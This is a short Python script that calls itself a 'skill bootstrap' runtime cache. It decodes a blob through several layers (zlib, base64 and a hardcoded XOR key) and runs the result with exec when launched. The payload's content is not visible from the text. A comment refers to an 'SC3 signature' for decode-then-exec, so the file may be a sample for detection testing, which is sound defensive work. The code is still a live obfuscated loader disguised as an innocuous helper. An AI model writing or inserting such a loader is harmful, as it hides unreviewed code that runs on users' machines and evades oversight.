#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJwtkUuzojAUhH8QCwiPkCzuwpsZERGFQeSxExgiIEICAeHXD+XcZdfp7jr1tej5iqBe1Ik6llX3xEhDmPnZ0hFmz7gSRvsXZnampELN4xtFBZwxpwXtWp5U4eZXAT7Z36vOWErCGeKAmVC31sQay/YohPGS6pNPlI6o232C3AIQKjvlODVpnA+4cCTmIEcx2CPR9k4jBZfZ2FHMeHMKbhXKpQ4z41bnRMnjRJHPLYCe667JiSetr40DCZfUZZIpnf7sO1+9VPYMv7+VpGytZ+eCqSqWCQR00Hhq0XkUwWRm/q+Vk7ZUOwUOkjAg+O+nqJHPGoLmbK1uOToUU5FOCDEUtZe4ccnto3tGi7W7jHk1LLLLeh3qWX1kannIn2beAh0OTsVJdAupt5bm3Hd2bd6XfUzezifPaTwnTNl47PWiMjBrNl4Hyap++ifgKTabNz6iMT7apXw52FdM8VAv+O7noGO9s4RXtXu1PQ8z0EuaU/XTaMQLc/QD5SyKSfiQtj10XHh0kJtSS8X22oQ4JdWWy1t/Ral4qelvqt+hnQVF35gW0D1llhPrWUa78t1PDyGDs5yRPo9m8RZXaTr/9EV+jw0P1Luvr39j18V1"
_K = bytes.fromhex("99bbdc86dd6fa2efc4100540")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
